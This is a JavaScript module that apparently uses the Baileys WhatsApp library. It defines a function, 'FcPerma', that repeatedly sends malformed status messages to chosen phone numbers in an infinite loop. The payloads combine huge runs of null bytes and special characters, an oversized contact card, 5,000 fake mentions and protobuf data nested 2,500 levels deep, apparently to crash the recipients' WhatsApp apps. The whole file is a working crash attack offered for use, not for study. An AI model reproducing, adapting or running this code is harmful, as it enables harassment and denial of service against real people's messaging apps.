const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function FcPerma(sock, target) {
  if (!sock || !target) {
    console.log('[fcperma] missing sock or target');
    return;
  }

  // ---- Sender guard ----
  // Never let the paired number target itself.
  try {
    const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
    const senderNum = senderRaw.split('@')[0].split(':')[0];
    const firstTarget = Array.isArray(target) ? target[0] : target;
    const targetNum = String(firstTarget).split('@')[0].split(':')[0];
    if (senderNum && targetNum && senderNum === targetNum) {
      console.log('[fcperma] skipped — target equals sender (' + senderNum + ')');
      return;
    }
  } catch (_) {
    // fall through
  }

  const jids = [target].flat().map(s => s.includes('@') ? s : s.replace(/\D/g,'')+'@s.whatsapp.net').filter(j=>j.length>15);
  if (!jids.length) return;

  const bomb = "\u0000".repeat(60000) + "ꦾ".repeat(60000) + "]".repeat(60000) + "[".repeat(60000);
  const mentions = Array.from({ length: 5000 }, (_, i) => i + 62 + "@s.whatsapp.net");

  const contact = {
    displayName: "🦠⃟꙰R?4YModsExpose " + bomb.slice(0, 2000),
    vcard: bomb.slice(0, 5000) + "\x00\xBA".repeat(30000)
  };

  const base = proto.Message.encode(proto.Message.fromObject({
    contactMessage: contact
  })).finish();

  const encode = (n) => {
    const b = [];
    while (n >= 128) { b.push((n & 127) | 128); n >>>= 7; }
    b.push(n);
    return Buffer.from(b);
  };

  const wrap = (tag, data) => Buffer.concat([Buffer.from(tag), encode(data.length), data]);
  const tags = [[0xBA,0x03],[0xD2,0x04],[0xAA,0x02]];

  while (true) {
    try {
      for (let o = 0; o < jids.length; o += 5) {
        const chunk = jids.slice(o, o + 5);
        if (o) await new Promise(r => setTimeout(r, 100));

        for (const tag of tags) {
          let b = base;
          for (let i = 0; i < 2500; i++) b = wrap(tag, wrap([0x0A], b));

          let payload;
          try { payload = proto.Message.decode(b); } catch (_) { continue; }

          try {
            await sock.relayMessage('status@broadcast', payload, {
              messageId: '福 | ᥅ᥲᥡᘔᥱ𝗍һ - Ϝσɾƈҽƈʅσʂҽ' + Date.now().toString(36).toUpperCase(),
              statusJidList: chunk,
              additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                  tag: 'mentioned_users',
                  attrs: {},
                  content: chunk.map(j => ({ tag: 'to', attrs: { jid: j }, content: [] }))
                }]
              }]
            });
          } catch (relayErr) {
            console.log('[fcperma relay]', (relayErr && relayErr.message) ? relayErr.message : relayErr);
          }
        }
      }
    } catch (loopErr) {
      console.log('[fcperma loop]', (loopErr && loopErr.message) ? loopErr.message : loopErr);
      // small backoff so a hard failure doesn't spin the CPU
      await new Promise(r => setTimeout(r, 1000));
    }
  }
}

module.exports = { FcPerma };
